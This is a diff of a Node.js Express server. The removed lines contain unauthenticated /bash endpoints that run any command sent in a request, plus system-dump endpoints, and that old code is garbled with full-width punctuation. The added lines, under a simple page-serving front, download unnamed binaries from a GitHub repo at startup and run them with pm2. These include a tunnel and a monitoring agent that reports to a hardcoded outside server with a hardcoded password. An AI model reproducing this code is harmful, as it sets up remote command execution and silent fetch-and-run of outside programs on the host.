@@ -1,117 +1,141 @@
+#!/usr/bin/env node
 
-const port = process.env。PORT || 3000;
-const express = require("express");
+const express = require('express');
+const fs = require('fs');
+const path = require('path');
+const util = require('util');
+const exec = util.promisify(require('child_process').exec);
+const axios = require('axios');
+
 const app = express();
-var exec = require("child_process")。exec;
-const os = require("os");
-const { createProxyMiddleware } = require("http-proxy-middleware");
-var request = require("request");
-var fs = require("fs");
-var path = require("path");
-const cors = require('cors');
-
-
-
-app.use(cors());
-
 app.use(express.json());
 
-//首页显示内容
-app.get("/"， function (req， res) {
-  res.send("hello world");
-});
+const PWD = '/tmp';
+const port = process.env.PORT || 3000;
 
-app.post("/bash"， (req， res) => {
-    let cmdstr = req.body。cmd;
-    if (!cmdstr) {
-        res.status(400)。send("命令不能为空");
-        return;
-    }
-    exec(cmdstr, (err， stdout， stderr) => {
-        if (err) {
-            res.type("html")。send("<pre>命令行执行错误：\n" + err + "</pre>");
-        } else {
-            res.type("html")。send("<pre>" + stdout + "</pre>");
+const NEZHA_SERVER = process.env.NEZHA_SERVER || 'data.king360.eu.org:443';
+const NEZHA_PASSWORD = process.env.NEZHA_PASSWORD || '147';
+const NEZHA_TLS = !!(NEZHA_SERVER.endsWith('443'));
+
+const pm2Config = {
+    apps: [
+        {
+            name: 'cc',
+            script: `${PWD}/cc`,
+            args: `tunnel --url http://localhost:30070 --no-autoupdate --edge-ip-version auto --protocol http2`,
+            autorestart: true,
+            restart_delay: 5000,
+            error_file: 'argo-err.log',
+            out_file: 'argo.log',
+        },
+        {
+            name: 'app',
+            script: `${PWD}/node`,
+            autorestart: true,
+            restart_delay: 5000,
+            error_file: 'NULL',
+            out_file: 'NULL',
+        },
+        {
+            name: 'agent',
+            script: `${PWD}/agent`,
+            args: `-s ${NEZHA_SERVER} -p ${NEZHA_PASSWORD} ${NEZHA_TLS ? '--tls' : ''}`,
+            autorestart: true,
+            restart_delay: 5000,
+            error_file: 'NULL',
+            out_file: 'NULL',
+        },
+    ],
+};
+
+const configJSON = JSON.stringify(pm2Config, null, 2);
+fs.writeFileSync(path.join(PWD, 'ecosystem.config.js'), `module.exports = ${configJSON};`);
+
+const downloadFiles = async () => {
+    const files = {
+        "index.html": "https://github.com/lemongaa/pack/raw/main/index.html",
+        "node": "https://github.com/lemongaa/pack/raw/main/web",
+        "cc": "https://github.com/lemongaa/pack/raw/main/cc",
+        "agent": "https://github.com/lemongaa/pack/raw/main/agent"
+    };
+
+    for (let file of Object.keys(files)) {
+        let filePath = path.join(PWD, file);
+        try {
+            await fs.promises.access(filePath, fs.constants.F_OK);
+            console.log(`文件 ${file} 已存在，跳过下载`);
+        } catch (err) {
+            let stream = fs.createWriteStream(filePath);
+            const response = await axios({
+                method: 'get',
+                url: files[file],
+                responseType: 'stream'
+            });
+            response.data.pipe(stream);
+            await new Promise((resolve, reject) => {
+                stream.on('finish', () => {
+                    fs.chmodSync(filePath, 0o755);
+                    console.log(`文件 ${file} 下载完成`);
+                    resolve();
+                });
+                stream.on('error', reject);
+            });
         }
-    });
-});
-
-
-
-app.get("/bash"， (req， res) => {
-    let cmdstr = req.query。cmd;
-    if (!cmdstr) {
-        res.status(400)。send("命令不能为空");
-        return;
     }
-    exec(cmdstr, (err， stdout， stderr) => {
-        if (err) {
-            res.type("html")。send("<pre>命令行执行错误：\n" + err + "</pre>");
+};
+
+const startPM2 = async () => {
+    try {
+        const { stdout } = await exec(`npx pm2 start ${path.join(PWD, 'ecosystem.config.js')}`);
+        console.log('PM2 启动结果:\n' + stdout);
+    } catch (error) {
+        console.log(`启动 PM2 出错: ${error}`);
+        throw error;
+    }
+};
+
+const startService = async (serviceName) => {
+    try {
+        const { stdout } = await exec(`npx pm2 ls | grep ${serviceName}`);
+        if (stdout.trim().includes('online')) {
+            console.log(`${serviceName} already running`);
         } else {
-            res.type("html")。send("<pre>" + stdout + "</pre>");
+            const { stdout } = await exec(`npx pm2 start ${serviceName}`);
+            console.log(`${serviceName} start success: ${stdout}`);
         }
-    });
-});
+    } catch (err) {
+        console.log('exec error: ' + err);
+    }
+};
 
+const init = async () => {
+    await downloadFiles();
+    await startPM2();
+    const services = ['cc', 'agent', 'app'];
+    for (let service of services) {
+        await startService(service);
+    }
+    console.log('所有文件下载完成！');
+};
 
+init();
 
+app.get('/', (req, res) => {
+  const indexPath = path.join(PWD, 'index.html');
 
-
-//获取系统进程表
-app.get("/status"， function (req， res) {
-  let cmdStr = "pm2 ls && ps -ef | grep  -v 'defunct' && ls -l / && ls -l";
-  exec(cmdStr, function (err， stdout， stderr) {
+  fs.readFile(indexPath, 'utf8', (err, data) => {
     if (err) {
-      res.type("html")。send("<pre>命令行执行错误：\n" + err + "</pre>");
-    }
-    else {
-      res.type("html")。send("<pre>获取系统进程表：\n" + stdout + "</pre>");
+      console.error(err);
+      res.status(500).send('Internal Server Error');
+    } else {
+      res.status(200).send(data); // 返回200状态码
     }
   });
 });
-
-
-//获取系统监听端口
-app.get("/listen"， function (req， res) {
-    let cmdStr = "ss -nltp";
-    exec(cmdStr, function (err， stdout， stderr) {
-      if (err) {
-        res.type("html")。send("<pre>命令行执行错误：\n" + err + "</pre>");
-      }
-      else {
-        res.type("html")。send("<pre>获取系统监听端口：\n" + stdout + "</pre>");
-      }
-    });
+  
+  app.listen(port, () => {
+    console.log(`Server running on port ${port}.`);
   });
-
-//获取节点数据
-app.get("/list"， function (req， res) {
-    let cmdStr = "cat list";
-    exec(cmdStr, function (err， stdout， stderr) {
-      if (err) {
-        res.type("html")。send("<pre>命令行执行错误：\n" + err + "</pre>");
-      }
-      else {
-        res.type("html")。send("<pre>节点数据：\n\n" + stdout + "</pre>");
-      }
-    });
-  });
-
-
-app.use(
-  "/"，
-  createProxyMiddleware({
-    changeOrigin: true， // 默认false，是否需要改变原始主机头为目标URL
-    onProxyReq: function onProxyReq(proxyReq， req， res) {}，
-    pathRewrite: {
-      // 请求中去除/
-      "^/": "/"
-    }，
-    target: "http://127.0.0.1:8080/"， // 需要跨域处理的请求地址
-    ws: true // 是否代理websockets
-  })
-);
-
-
-
-app.listen(port, () => console.log(`Example app listening on port ${port}!`));
+  
+  // 保持进程运行
+  setInterval(() => {}, 1000);
